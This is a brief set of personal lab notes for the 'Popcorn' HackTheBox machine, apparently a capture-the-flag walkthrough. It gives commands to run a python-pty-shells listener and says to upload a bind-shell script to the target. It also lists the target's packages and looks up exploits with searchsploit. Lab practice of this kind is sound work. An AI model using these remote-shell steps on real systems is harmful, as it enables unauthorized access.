# POPCORN HackTheBox

[Video Link](https://www.youtube.com/watch?v=NMGsnPSm8iw)

Use python-pty-shells to get reverse bind shells

Listening on the host machine
```
python tcp_pty_shell_handler.py -b IP:PORT
```

Upload the file `tcp_pty_bind.py` to the target server to initiate the shell

## Check the list of packages installed
```
dpkg -l
```

## See the contents of the exploit on searchsploit exploits
```
searchsploit -x <NUMBER.EXT>
```

